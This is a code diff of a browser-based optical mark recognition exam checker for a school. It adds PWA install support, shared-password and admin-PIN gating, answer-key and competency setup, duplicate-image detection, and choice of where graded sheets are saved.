+          <stop offset="0%" stop-color="#0f172a"/>
+          <stop offset="55%" stop-color="#1e3a8a"/>
+          <stop offset="100%" stop-color="#2563eb"/>
+        </linearGradient>
+        <linearGradient id="goldG" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#fde047"/>
+          <stop offset="50%" stop-color="#f59e0b"/>
+          <stop offset="100%" stop-color="#d97706"/>
+        </linearGradient>
+      </defs>
+      <rect width="120" height="120" rx="26" fill="#0f172a"/>
+      <path d="M60 8 L104 25 V60 C104 86 85 104 60 113 C35 104 16 86 16 60 V25 L60 8 Z"
+            fill="url(#bgG)" stroke="url(#goldG)" stroke-width="4.5"/>
+      <path d="M31 35 V28 H38 M89 35 V28 H82 M31 81 V88 H38 M89 81 V88 H82"
+            fill="none" stroke="#38bdf8" stroke-width="3.2" stroke-linecap="round"/>
+      <rect x="37" y="32" width="46" height="52" rx="6" fill="#ffffff"/>
+      <circle cx="48" cy="44" r="4" fill="#1e3a8a"/>
+      <circle cx="60" cy="44" r="4" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <circle cx="72" cy="44" r="4" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <circle cx="48" cy="57" r="4" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <circle cx="60" cy="57" r="4" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <circle cx="72" cy="57" r="4" fill="#1e3a8a"/>
+      <circle cx="48" cy="70" r="4" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <circle cx="60" cy="70" r="4" fill="#16a34a"/>
+      <circle cx="72" cy="70" r="4" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <rect x="26" y="55.5" width="68" height="3" rx="1.5" fill="#38bdf8"/>
+      <circle cx="84" cy="82" r="15" fill="#16a34a" stroke="#ffffff" stroke-width="2.8"/>
+      <path d="M77.5 82 L82 86.5 L91 77.5" fill="none" stroke="#ffffff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>`;
+  }
+
+  function initCrossPlatformPwa() {
+    // Generate 192x192 & 512x512 PNG icons from our bespoke SVG for iOS Safari & Android Chrome
+    const svgBlob = new Blob([getBespokeLogoSvgMarkup()], { type: 'image/svg+xml;charset=utf-8' });
+    const svgUrl = URL.createObjectURL(svgBlob);
+    const img = new Image();
+    img.onload = () => {
+      const makePngIcon = (size) => {
+        const c = document.createElement('canvas');
+        c.width = size;
+        c.height = size;
+        c.getContext('2d').drawImage(img, 0, 0, size, size);
+        return c.toDataURL('image/png');
+      };
+      const icon192 = makePngIcon(192);
+      const icon512 = makePngIcon(512);
+      URL.revokeObjectURL(svgUrl);
+
+      document.getElementById('dynamicFaviconLink')?.setAttribute('href', icon192);
+      document.getElementById('dynamicAppleIconLink')?.setAttribute('href', icon512);
+
+      // Update manifest link with high-res PNG icons & resolved start_url for Android/iOS Home Screen
+      try {
+        const resolvedStartUrl = new URL('./index.html', window.location.href).href;
+        const resolvedScope = new URL('./', window.location.href).href;
+        const manifestObj = {
+          id: resolvedStartUrl,
+          name: 'CPGHS Optical Mark Recognition (OMR) Exam Checker',
+          short_name: 'CPGHS OMR',
+          description: 'Optical Mark Recognition (OMR) Exam Checker & Item Analytics for CPGHS',
+          start_url: resolvedStartUrl,
+          scope: resolvedScope,
+          display: 'standalone',
+          orientation: 'portrait',
+          background_color: '#0f172a',
+          theme_color: '#1e3a8a',
+          icons: [
+            { src: icon192, sizes: '192x192', type: 'image/png', purpose: 'any maskable' },
+            { src: icon512, sizes: '512x512', type: 'image/png', purpose: 'any maskable' }
+          ]
+        };
+        const manifestBlob = new Blob([JSON.stringify(manifestObj)], { type: 'application/manifest+json' });
+        document.getElementById('dynamicManifestLink')?.setAttribute('href', URL.createObjectURL(manifestBlob));
+      } catch (e) { /* Keep static manifest.json fallback */ }
+    };
+    img.src = svgUrl;
+
+    // Register external sw.js for offline PWA caching on Android & iOS
+    if ('serviceWorker' in navigator && window.location.protocol.startsWith('http')) {
+      navigator.serviceWorker.register('./sw.js').catch(() => {});
+    }
+
+    // Hide install button if already running as installed standalone PWA
+    const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true;
+    if (isStandalone) {
+      const btn = document.getElementById('pwaInstallHeaderBtn');
+      if (btn) btn.style.display = 'none';
+    }
+  }
+
+  let deferredInstallPrompt = null;
+  window.addEventListener('beforeinstallprompt', (e) => {
+    e.preventDefault();
+    deferredInstallPrompt = e;
+  });
+
+  async function triggerPwaInstall() {
+    if (deferredInstallPrompt) {
+      deferredInstallPrompt.prompt();
+      const choice = await deferredInstallPrompt.userChoice;
+      if (choice && choice.outcome === 'accepted') {
+        const btn = document.getElementById('pwaInstallHeaderBtn');
+        if (btn) btn.style.display = 'none';
+      }
+      deferredInstallPrompt = null;
+      return;
+    }
+
+    const ua = navigator.userAgent || '';
+    const isIOS = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+    if (isIOS) {
+      showCenterModal(
+        'Install on iPhone / iPad (iOS)',
+        '1. Tap the Share button (⬆️) at the bottom of Safari.\n2. Scroll down and tap "Add to Home Screen" (➕).\n3. Tap "Add" at the top-right to install CPGHS OMR Exam Checker with its custom icon.',
+        'info'
+      );
+    } else {
+      showCenterModal(
+        'Install on Android / Desktop',
+        '1. Open your browser menu (⋮ at the top-right).\n2. Tap "Install app" or "Add to Home screen".\n3. Confirm "Install" to launch CPGHS OMR Exam Checker as a full-screen app.',
+        'info'
+      );
+    }
+  }
+
+  // =========================================================================
+  // 3. SECURITY & AUTHENTICATION
+  // =========================================================================
   async function sha256Hex(str) {
     const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(String(str)));
     return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
   }
 
   async function initSecurityHashes() {
-    if (!localStorage.getItem(KEY_USER_PASS_HASH)) {
-      localStorage.setItem(KEY_USER_PASS_HASH, await sha256Hex(DEFAULT_USER_PASS));
+    if (!localStorage.getItem(LS_USER_PASS_HASH)) {
+      localStorage.setItem(LS_USER_PASS_HASH, await sha256Hex(DEFAULT_USER_PASS));
     }
-    if (!localStorage.getItem(KEY_ADMIN_PIN_HASH)) {
-      localStorage.setItem(KEY_ADMIN_PIN_HASH, await sha256Hex(DEFAULT_ADMIN_PIN));
+    if (!localStorage.getItem(LS_ADMIN_PIN_HASH)) {
+      localStorage.setItem(LS_ADMIN_PIN_HASH, await sha256Hex(DEFAULT_ADMIN_PIN));
     }
   }
 
@@ -971,8 +1086,8 @@
       return;
     }
     const enteredHash = await sha256Hex(val);
-    const storedUserHash = localStorage.getItem(KEY_USER_PASS_HASH);
-    const storedAdminHash = localStorage.getItem(KEY_ADMIN_PIN_HASH);
+    const storedUserHash = localStorage.getItem(LS_USER_PASS_HASH);
+    const storedAdminHash = localStorage.getItem(LS_ADMIN_PIN_HASH);
 
     if (enteredHash === storedUserHash || enteredHash === storedAdminHash) {
       errEl.textContent = '';
@@ -982,8 +1097,8 @@
         isAdminUnlocked = true;
         refreshAdminSetupGate();
       }
-      // Redirect immediately to First Tab: TOS / Keys
       restoreAllExamIdDropdowns();
+      renderScanHistoryTable();
       switchTab('tos', document.getElementById('nav-tos'));
     } else {
       errEl.textContent = 'Incorrect password. Contact the CPGHS OMR Developer/Admin.';
@@ -998,14 +1113,13 @@
       return;
     }
     const enteredHash = await sha256Hex(pinVal);
-    const storedAdminHash = localStorage.getItem(KEY_ADMIN_PIN_HASH);
-    if (enteredHash === storedAdminHash) {
+    if (enteredHash === localStorage.getItem(LS_ADMIN_PIN_HASH)) {
       isAdminUnlocked = true;
       document.getElementById('adminPinInput').value = '';
       refreshAdminSetupGate();
       showCenterModal('Admin Access Granted', 'Developer/Admin setup controls are now unlocked.', 'success');
     } else {
-      showCenterModal('Access Denied', 'Invalid Developer/Admin PIN. Only the developer/admin can modify Setup.', 'danger');
+      showCenterModal('Access Denied', 'Invalid Developer/Admin PIN.', 'danger');
     }
   }
 
@@ -1016,6 +1130,8 @@
       gate.style.display = isAdminUnlocked ? 'none' : 'block';
       ctrls.style.display = isAdminUnlocked ? 'block' : 'none';
     }
+    const gasInput = document.getElementById('gasUrlInput');
+    if (gasInput) gasInput.value = localStorage.getItem(LS_GAS_URL) || '';
   }
 
   async function updateSharedUserPassword() {
@@ -1025,7 +1141,7 @@
       showCenterModal('Invalid Password', 'Shared User Password must be at least 4 characters.', 'warning');
       return;
     }
-    localStorage.setItem(KEY_USER_PASS_HASH, await sha256Hex(newPass));
+    localStorage.setItem(LS_USER_PASS_HASH, await sha256Hex(newPass));
     document.getElementById('newSharedUserPassInput').value = '';
     showCenterModal('User Password Updated', 'All CPGHS users will now use the updated shared password.', 'success');
   }
@@ -1042,10 +1158,10 @@
       showCenterModal('PIN Mismatch', 'The two Admin PIN entries do not match.', 'warning');
       return;
     }
-    localStorage.setItem(KEY_ADMIN_PIN_HASH, await sha256Hex(p1));
+    localStorage.setItem(LS_ADMIN_PIN_HASH, await sha256Hex(p1));
     document.getElementById('newAdminPinInput').value = '';
     document.getElementById('confirmAdminPinInput').value = '';
-    showCenterModal('Admin PIN Encrypted', 'New Developer/Admin PIN has been encrypted with SHA-256 and saved.', 'success');
+    showCenterModal('Admin PIN Encrypted', 'New Developer/Admin PIN has been encrypted and saved.', 'success');
   }
 
   function lockAdminAndApp() {
@@ -1055,43 +1171,37 @@
   }
 
   // =========================================================================
-  // 2. GUIDED WORKFLOW NAVIGATION & EXAM ID SYNCHRONIZATION
+  // 4. NAVIGATION, EXAM ID SYNC & TOS MANAGEMENT
   // =========================================================================
   function switchTab(tabName, btn) {
     document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
     document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-    const target = document.getElementById('view-' + tabName);
-    if (target) target.classList.add('active');
+    document.getElementById('view-' + tabName)?.classList.add('active');
+    (btn || document.getElementById('nav-' + tabName))?.classList.add('active');
 
-    const navBtn = btn || document.getElementById('nav-' + tabName);
-    if (navBtn) navBtn.classList.add('active');
-
-    // Update top workflow step highlight
     document.getElementById('wfStep1')?.classList.toggle('active', tabName === 'tos');
     document.getElementById('wfStep2')?.classList.toggle('active', tabName === 'scanner');
     document.getElementById('wfStep3')?.classList.toggle('active', tabName === 'analytics');
 
     if (tabName === 'settings') refreshAdminSetupGate();
-    if (tabName === 'scanner') restoreAllExamIdDropdowns();
+    if (tabName === 'scanner') {
+      restoreAllExamIdDropdowns();
+      restoreDestinationUiState();
+      renderScanHistoryTable();
+    }
+    if (tabName === 'analytics') {
+      restoreAllExamIdDropdowns();
+      loadAnalytics();
+    }
   }
 
-  function proceedFromTosToScanner() {
-    const tosExam = document.getElementById('tosExamId')?.value || '';
-    const tosType = document.getElementById('tosTestType')?.value || 'ST1';
-    restoreAllExamIdDropdowns();
-    if (tosExam) {
-      const scanSel = document.getElementById('examSelect');
-      if (scanSel) scanSel.value = tosExam;
-      localStorage.setItem('cpghs_last_selected_exam', tosExam);
-    }
-    const modeSel = document.getElementById('sectionMode');
-    if (modeSel && tosType) modeSel.value = tosType;
-    if (typeof onExamSelected === 'function') onExamSelected();
-    switchTab('scanner', document.getElementById('nav-scanner'));
+  function getSavedKeys() {
+    try { return JSON.parse(localStorage.getItem(LS_EXAM_KEYS) || '{}'); }
+    catch (e) { return {}; }
   }
 
   function restoreAllExamIdDropdowns() {
-    const savedKeys = JSON.parse(localStorage.getItem('cpghs_omr_exam_keys') || '{}');
+    const savedKeys = getSavedKeys();
     const subjectSelect = document.getElementById('tosSubject');
     const testTypes = ['ST1', 'ST2', 'TERM'];
     const generatedDefaults = [];
@@ -1099,19 +1209,15 @@
     if (subjectSelect) {
       Array.from(subjectSelect.options).forEach(opt => {
         const code = (opt.getAttribute('data-code') || '').trim();
-        if (code) {
-          testTypes.forEach(type => generatedDefaults.push(`${code}-${type}`));
-        }
+        if (code) testTypes.forEach(type => generatedDefaults.push(`${code}-${type}`));
       });
     }
 
     const allIds = Array.from(new Set([...Object.keys(savedKeys), ...generatedDefaults]));
-    const dropdownIds = ['examSelect', 'analyticsExamSelect', 'tosExamId'];
-
-    dropdownIds.forEach(ddId => {
+    ['examSelect', 'analyticsExamSelect', 'tosExamId'].forEach(ddId => {
       const sel = document.getElementById(ddId);
       if (!sel) return;
-      const prevVal = sel.value || localStorage.getItem('cpghs_last_selected_exam') || '';
+      const prevVal = sel.value || localStorage.getItem(LS_LAST_EXAM) || '';
       sel.innerHTML = '<option value="">-- Select Exam ID --</option>';
       allIds.forEach(id => {
         const opt = document.createElement('option');
@@ -1119,120 +1225,1252 @@
         opt.textContent = savedKeys[id] ? `${id} (Key Saved ✓)` : id;
         sel.appendChild(opt);
       });
-      if (prevVal && allIds.includes(prevVal)) {
-        sel.value = prevVal;
-      }
+      if (prevVal && allIds.includes(prevVal)) sel.value = prevVal;
     });
   }
 
-  // =========================================================================
-  // 3. CAMERA CAPTURE + AUTO-SAVE CHECKED SHEET TO GALLERY BEFORE NEXT CAPTURE
-  // =========================================================================
-  function triggerCameraCapture() {
-    const examVal = document.getElementById('examSelect')?.value || '';
-    if (!examVal) {
-      showCenterModal('Select Exam Key First', 'Please select a Saved Exam Key and Sheet Format at the top of the Scanner before capturing an answer sheet.', 'warning');
+  function syncTosExamIdFromFields() {
+    const subjectSelect = document.getElementById('tosSubject');
+    const testTypeSelect = document.getElementById('tosTestType');
+    const examIdSelect = document.getElementById('tosExamId');
+    const selectedOption = subjectSelect.options[subjectSelect.selectedIndex];
+    const code = selectedOption ? (selectedOption.getAttribute('data-code') || '').trim() : '';
+    const type = (testTypeSelect.value || '').trim();
+    if (!code || !type) return;
+
+    const generatedId = `${code}-${type}`;
+    restoreAllExamIdDropdowns();
+    examIdSelect.value = generatedId;
+    localStorage.setItem(LS_LAST_EXAM, generatedId);
+    loadTosFieldsForExam(generatedId);
+  }
+
+  function syncTosFromExamId() {
+    const examId = (document.getElementById('tosExamId')?.value || '').trim();
+    if (!examId) return;
+    localStorage.setItem(LS_LAST_EXAM, examId);
+    const dash = examId.lastIndexOf('-');
+    if (dash > 0) {
+      const code = examId.substring(0, dash);
+      const type = examId.substring(dash + 1);
+      const subjSel = document.getElementById('tosSubject');
+      const typeSel = document.getElementById('tosTestType');
+      const matchSubj = Array.from(subjSel.options).find(o => o.getAttribute('data-code') === code);
+      if (matchSubj) subjSel.value = matchSubj.value;
+      if (['ST1', 'ST2', 'TERM'].includes(type)) typeSel.value = type;
+    }
+    loadTosFieldsForExam(examId);
+  }
+
+  function loadTosFieldsForExam(examId) {
+    const record = getSavedKeys()[examId];
+    const keyField = document.getElementById('tosAnswerKey');
+    const listEl = document.getElementById('tosCompetencyList');
+    listEl.innerHTML = '';
+    if (!record) {
+      keyField.value = '';
+      addTosCompetencyRow('LC-1', '', '1-5');
       return;
     }
-    galleryAlreadySavedForCurrentSheet = false;
-    const camInput = document.getElementById('cameraCaptureInput');
-    if (camInput) {
-      camInput.setAttribute('capture', 'environment');
-      camInput.value = '';
-      camInput.click();
+    keyField.value = Array.isArray(record.key) ? record.key.join(',') : (record.key || '');
+    const comps = Array.isArray(record.competencies) && record.competencies.length
+      ? record.competencies
+      : [{ code: 'LC-1', description: '', items: '1-5' }];
+    comps.forEach(c => addTosCompetencyRow(c.code, c.description, Array.isArray(c.items) ? c.items.join(',') : c.items));
+  }
+
+  function addTosCompetencyRow(code = '', desc = '', items = '') {
+    const listEl = document.getElementById('tosCompetencyList');
+    const idx = listEl.children.length + 1;
+    const row = document.createElement('div');
+    row.className = 'tos-row';
+    row.innerHTML = `
+      <input type="text" class="tos-code" placeholder="LC-${idx}" value="${code || 'LC-' + idx}" />
+      <input type="text" class="tos-desc" placeholder="Competency description" value="${desc || ''}" />
+      <input type="text" class="tos-items" placeholder="1-5" value="${items || ''}" />
+      <button type="button" class="btn-danger btn-sm" style="padding:7px;" onclick="this.parentElement.remove()">✕</button>
+    `;
+    listEl.appendChild(row);
+  }
+
+  function parseItemRangeString(str) {
+    const out = new Set();
+    String(str || '').split(',').forEach(part => {
+      const clean = part.trim();
+      if (!clean) return;
+      if (clean.includes('-')) {
+        const [a, b] = clean.split('-').map(n => parseInt(n.trim(), 10));
+        if (!isNaN(a) && !isNaN(b) && a <= b) {
+          for (let i = a; i <= Math.min(b, 100); i++) out.add(i);
+        }
+      } else {
+        const n = parseInt(clean, 10);
+        if (!isNaN(n)) out.add(n);
+      }
+    });
+    return Array.from(out).sort((a, b) => a - b);
+  }
+
+  async function saveKeyAndTosToSheet() {
+    const examId = (document.getElementById('tosExamId')?.value || '').trim();
+    if (!examId) {
+      showCenterModal('Select Exam ID', 'Please select a Subject and Test Type (or Exam ID) first.', 'warning');
+      return;
+    }
+    const rawKey = (document.getElementById('tosAnswerKey')?.value || '').toUpperCase();
+    const keyArr = rawKey.split(/[^A-D]+/).filter(Boolean);
+    if (keyArr.length === 0) {
+      showCenterModal('Invalid Answer Key', 'Please enter valid answer choices (A, B, C, or D).', 'warning');
+      return;
+    }
+
+    const competencies = [];
+    document.querySelectorAll('#tosCompetencyList .tos-row').forEach((row, i) => {
+      const code = row.querySelector('.tos-code')?.value.trim() || `LC-${i + 1}`;
+      const description = row.querySelector('.tos-desc')?.value.trim() || `Competency ${i + 1}`;
+      const items = parseItemRangeString(row.querySelector('.tos-items')?.value || '');
+      if (items.length > 0) competencies.push({ code, description, items });
+    });
+
+    const savedKeys = getSavedKeys();
+    savedKeys[examId] = {
+      examId,
+      subject: document.getElementById('tosSubject')?.value || examId,
+      testType: document.getElementById('tosTestType')?.value || 'ST1',
+      key: keyArr,
+      competencies,
+      updatedAt: new Date().toISOString()
+    };
+    localStorage.setItem(LS_EXAM_KEYS, JSON.stringify(savedKeys));
+    localStorage.setItem(LS_LAST_EXAM, examId);
+    restoreAllExamIdDropdowns();
+
+    const gasUrl = (localStorage.getItem(LS_GAS_URL) || '').trim();
+    if (gasUrl) {
+      try {
+        await fetch(gasUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+          body: JSON.stringify({ action: 'saveExamKey', payload: savedKeys[examId] })
+        });
+      } catch (e) { /* Offline safe */ }
+    }
+
+    showCenterModal('Key & TOS Saved', `Saved ${keyArr.length}-item key for ${examId}. Ready for Image Capture!`, 'success');
+    if (hasLoadedCaptureImage) reanalyzeCapturedImage();
+  }
+
+  function proceedFromTosToScanner() {
+    const tosExam = document.getElementById('tosExamId')?.value || '';
+    const tosType = document.getElementById('tosTestType')?.value || 'ST1';
+    restoreAllExamIdDropdowns();
+    if (tosExam) {
+      document.getElementById('examSelect').value = tosExam;
+      localStorage.setItem(LS_LAST_EXAM, tosExam);
+    }
+    if (tosType) document.getElementById('sectionMode').value = tosType;
+    onExamSelected();
+    switchTab('scanner', document.getElementById('nav-scanner'));
+  }
+
+  function onExamSelected() {
+    const examId = document.getElementById('examSelect')?.value || '';
+    if (examId) {
+      localStorage.setItem(LS_LAST_EXAM, examId);
+      const saved = getSavedKeys()[examId];
+      if (saved && saved.testType) {
+        document.getElementById('sectionMode').value = saved.testType;
+      } else if (examId.endsWith('-TERM')) {
+        document.getElementById('sectionMode').value = 'TERM';
+      } else if (examId.endsWith('-ST2')) {
+        document.getElementById('sectionMode').value = 'ST2';
+      } else {
+        document.getElementById('sectionMode').value = 'ST1';
+      }
+    }
+    renderScanHistoryTable();
+    if (hasLoadedCaptureImage) reanalyzeCapturedImage();
+  }
+
+  // =========================================================================
+  // 5. IMAGE CAPTURE ONLY + DUPLICATE IMAGE FINGERPRINTING & CAUTION MODAL
+  // =========================================================================
+  function computeImageFingerprint(canvas) {
+    const tiny = document.createElement('canvas');
+    tiny.width = 16;
+    tiny.height = 16;
+    const tctx = tiny.getContext('2d');
+    tctx.drawImage(canvas, 0, 0, 16, 16);
+    const data = tctx.getImageData(0, 0, 16, 16).data;
+    const grays = [];
+    let sum = 0;
+    for (let i = 0; i < data.length; i += 4) {
+      const g = Math.round(0.299 * data[i] + 0.587 * data[i + 1] + 0.114 * data[i + 2]);
+      grays.push(g);
+      sum += g;
+    }
+    const avg = sum / grays.length;
+    let bits = '';
+    for (let i = 0; i < grays.length; i += 4) {
+      const nibble =
+        ((grays[i] >= avg ? 1 : 0) << 3) |
+        ((grays[i + 1] >= avg ? 1 : 0) << 2) |
+        ((grays[i + 2] >= avg ? 1 : 0) << 1) |
+        (grays[i + 3] >= avg ? 1 : 0);
+      bits += nibble.toString(16);
+    }
+    return `${canvas.width}x${canvas.height}_${bits}`;
+  }
+
+  function getSavedImageHashes() {
+    try { return JSON.parse(localStorage.getItem(LS_SAVED_HASHES) || '{}'); }
+    catch (e) { return {}; }
+  }
+
+  function setSavedImageHash(hash, meta) {
+    const map = getSavedImageHashes();
+    map[hash] = meta;
+    localStorage.setItem(LS_SAVED_HASHES, JSON.stringify(map));
+  }
+
+  function handlePhotoUpload(event) {
+    const input = event?.target;
+    const file = input?.files?.[0];
+    if (!file) return;
+
+    const wrapper = document.getElementById('photoStageWrapper');
+    const hud = document.getElementById('scanHud');
+    wrapper.classList.add('active');
+    hud.textContent = '⏳ Loading & analyzing captured image...';
+
+    const objectUrl = URL.createObjectURL(file);
+    const img = new Image();
+    img.onload = () => {
+      URL.revokeObjectURL(objectUrl);
+      if (input) input.value = '';
+
+      const maxDim = 1800;
+      let targetW = img.naturalWidth || img.width;
+      let targetH = img.naturalHeight || img.height;
+      if (targetW > maxDim || targetH > maxDim) {
+        const scale = maxDim / Math.max(targetW, targetH);
+        targetW = Math.round(targetW * scale);
+        targetH = Math.round(targetH * scale);
+      }
+
+      sourceImageCanvas.width = targetW;
+      sourceImageCanvas.height = targetH;
+      sourceImageCanvas.getContext('2d').drawImage(img, 0, 0, targetW, targetH);
+
+      hasLoadedCaptureImage = true;
+      activeCorners = null;
+      currentImageFingerprint = computeImageFingerprint(sourceImageCanvas);
+
+      processCapturedSheet();
+      checkForDuplicateAndWarn();
+    };
+    img.onerror = () => {
+      URL.revokeObjectURL(objectUrl);
+      if (input) input.value = '';
+      hud.textContent = '❌ Could not decode selected image.';
+      showCenterModal('Image Error', 'Unable to read that photo. Please capture or select another image.', 'danger');
+    };
+    img.src = objectUrl;
+  }
+
+  function checkForDuplicateAndWarn() {
+    const savedHashes = getSavedImageHashes();
+    const history = getScanHistory();
+    const existingByHash = savedHashes[currentImageFingerprint];
+    const existingByStudent = lastGradedPayload && !lastGradedPayload.lrn.startsWith('UNID-')
+      ? history.find(r => r.examId === lastGradedPayload.examId && r.lrn === lastGradedPayload.lrn)
+      : null;
+
+    if (existingByHash || existingByStudent) {
+      const info = existingByHash || existingByStudent;
+      const reason = existingByHash
+        ? `This exact answer sheet image was already saved (${info.examId || 'Exam'} — ${info.name || 'Student'}, Score: ${info.score ?? '?'}/${info.total ?? '?'}).`
+        : `Student ${existingByStudent.name} (${existingByStudent.lrn}) already has a saved image & score (${existingByStudent.score}/${existingByStudent.total}) for ${existingByStudent.examId}.`;
+
+      document.getElementById('duplicateCautionDesc').textContent =
+        `${reason}\n\nDo you want to overwrite the existing entry or select another image?`;
+      document.getElementById('duplicateCautionModal').classList.add('open');
     }
   }
 
-  function triggerGalleryUpload() {
-    const examVal = document.getElementById('examSelect')?.value || '';
-    if (!examVal) {
-      showCenterModal('Select Exam Key First', 'Please select a Saved Exam Key and Sheet Format at the top of the Scanner first.', 'warning');
-      return;
-    }
-    galleryAlreadySavedForCurrentSheet = false;
-    const galInput = document.getElementById('photoFileInput');
-    if (galInput) {
-      galInput.removeAttribute('capture');
-      galInput.value = '';
-      galInput.click();
+  function handleDuplicateOverwrite() {
+    document.getElementById('duplicateCautionModal').classList.remove('open');
+    executeSaveCheckedImage(true);
+  }
+
+  function dismissDuplicateAndPrepareNext() {
+    document.getElementById('duplicateCautionModal').classList.remove('open');
+    resetCaptureStage();
+  }
+
+  function cancelDuplicateModalKeepView() {
+    document.getElementById('duplicateCautionModal').classList.remove('open');
+  }
+
+  function resetCaptureStage() {
+    hasLoadedCaptureImage = false;
+    activeCorners = null;
+    currentImageFingerprint = '';
+    lastGradedPayload = null;
+    sourceImageCanvas.width = 0;
+    sourceImageCanvas.height = 0;
+    document.getElementById('photoStageWrapper').classList.remove('active');
+    document.getElementById('reviewControls').classList.remove('open');
+    document.getElementById('scoreBanner').classList.remove('open');
+  }
+
+  // =========================================================================
+  // 6. SAVE DESTINATION (PHONE GALLERY VS DESTINATION FOLDER PATH)
+  // =========================================================================
+  function selectSaveDestination(mode) {
+    saveDestinationMode = mode === 'folder' ? 'folder' : 'gallery';
+    localStorage.setItem(LS_SAVE_DEST_MODE, saveDestinationMode);
+    restoreDestinationUiState();
+  }
+
+  function restoreDestinationUiState() {
+    const isFolder = saveDestinationMode === 'folder';
+    document.getElementById('radioDestGallery').checked = !isFolder;
+    document.getElementById('radioDestFolder').checked = isFolder;
+    document.getElementById('pillDestGallery').classList.toggle('selected', !isFolder);
+    document.getElementById('pillDestFolder').classList.toggle('selected', isFolder);
+    document.getElementById('folderPathPanel').classList.toggle('open', isFolder);
+
+    const pathInput = document.getElementById('destFolderPathInput');
+    if (pathInput && !pathInput.value) {
+      pathInput.value = localStorage.getItem(LS_DEST_FOLDER) || '';
     }
   }
 
-  function downloadGradedCanvasToGallery() {
-    const canvas = document.getElementById('resultCanvas');
-    if (!canvas || canvas.width === 0 || canvas.height === 0) return false;
+  function persistDestinationFolderPath(val) {
+    localStorage.setItem(LS_DEST_FOLDER, (val || '').trim());
+  }
+
+  async function pasteDestinationFolderPath() {
+    const input = document.getElementById('destFolderPathInput');
+    if (!input) return;
     try {
-      const examId = (document.getElementById('examSelect')?.value || 'EXAM').replace(/[^A-Za-z0-9_-]/g, '_');
-      const lrn = (document.getElementById('studentLrn')?.value || 'SHEET').replace(/[^A-Za-z0-9_-]/g, '_');
-      const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        const clipText = await navigator.clipboard.readText();
+        if (clipText && clipText.trim()) {
+          input.value = clipText.trim();
+          persistDestinationFolderPath(input.value);
+          document.getElementById('driveUploadStatus').textContent =
+            `📋 Pasted destination folder path: ${input.value}`;
+          return;
+        }
+      }
+    } catch (e) { /* Fallback to manual paste focus */ }
+
+    input.focus();
+    input.select();
+    showCenterModal(
+      'Paste Destination Folder Path',
+      'Tap inside the highlighted Folder Path box and press "Paste" from your keyboard clipboard.',
+      'info'
+    );
+  }
+
+  async function pickRealDeviceFolder() {
+    if (!window.showDirectoryPicker) {
+      showCenterModal(
+        'Paste Folder Path Manually',
+        'Direct folder browsing is not supported in this mobile browser. Paste your destination folder path into the text box above instead.',
+        'info'
+      );
+      return;
+    }
+    try {
+      pickedDirectoryHandle = await window.showDirectoryPicker({ mode: 'readwrite' });
+      const input = document.getElementById('destFolderPathInput');
+      if (pickedDirectoryHandle && pickedDirectoryHandle.name) {
+        input.value = `/${pickedDirectoryHandle.name}/`;
+        persistDestinationFolderPath(input.value);
+        document.getElementById('pickedDirBadge').textContent = `✓ Linked: ${pickedDirectoryHandle.name}`;
+      }
+    } catch (e) { /* User cancelled picker */ }
+  }
+
+  function saveCheckedImageWithDuplicateGuard() {
+    if (!hasLoadedCaptureImage) {
+      showCenterModal('No Image Captured', 'Capture or upload an answer sheet image first.', 'warning');
+      return;
+    }
+
+    if (saveDestinationMode === 'folder') {
+      const folderPath = (document.getElementById('destFolderPathInput')?.value || '').trim();
+      if (!folderPath && !pickedDirectoryHandle) {
+        showCenterModal(
+          'Destination Folder Path Required',
+          'Please paste or enter your destination folder path (or choose Phone Gallery).',
+          'warning'
+        );
+        return;
+      }
+    }
+
+    const savedHashes = getSavedImageHashes();
+    const history = getScanHistory();
+    const existingByHash = savedHashes[currentImageFingerprint];
+    const existingByStudent = lastGradedPayload && !lastGradedPayload.lrn.startsWith('UNID-')
+      ? history.find(r => r.examId === lastGradedPayload.examId && r.lrn === lastGradedPayload.lrn)
+      : null;
+
+    if (existingByHash || existingByStudent) {
+      document.getElementById('duplicateCautionDesc').textContent =
+        'Caution: This image or student sheet was already saved. Overwrite the existing record & image, or select another image?';
+      document.getElementById('duplicateCautionModal').classList.add('open');
+      return;
+    }
+
+    executeSaveCheckedImage(false);
+  }
+
+  async function executeSaveCheckedImage(isOverwrite) {
+    const canvas = document.getElementById('resultCanvas');
+    if (!canvas || canvas.width === 0) return;
+
+    const examId = (document.getElementById('examSelect')?.value || 'EXAM').replace(/[^A-Za-z0-9_-]/g, '_');
+    const lrn = (document.getElementById('studentLrn')?.value || 'SHEET').replace(/[^A-Za-z0-9_-]/g, '_');
+    const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+
+    const folderPath = (document.getElementById('destFolderPathInput')?.value || '').trim();
+    const folderCleanTag = folderPath
+      ? folderPath.split(/[\/]/).filter(Boolean).pop()?.replace(/[^A-Za-z0-9_-]/g, '_') || 'Folder'
+      : '';
+
+    const filename = (saveDestinationMode === 'folder' && folderCleanTag)
+      ? `${folderCleanTag}__CPGHS_OMR_${examId}_${lrn}_${ts}.jpg`
+      : `CPGHS_OMR_${examId}_${lrn}_${ts}.jpg`;
+
+    const destLabel = saveDestinationMode === 'folder'
+      ? `Folder: ${folderPath || (pickedDirectoryHandle?.name || 'Custom')}`
+      : 'Phone Gallery';
+
+    if (lastGradedPayload) {
+      lastGradedPayload.savedDestination = destLabel;
+      lastGradedPayload.imageHash = currentImageFingerprint;
+      upsertScanRecord(lastGradedPayload);
+    }
+    if (currentImageFingerprint) {
+      setSavedImageHash(currentImageFingerprint, {
+        examId: lastGradedPayload?.examId || examId,
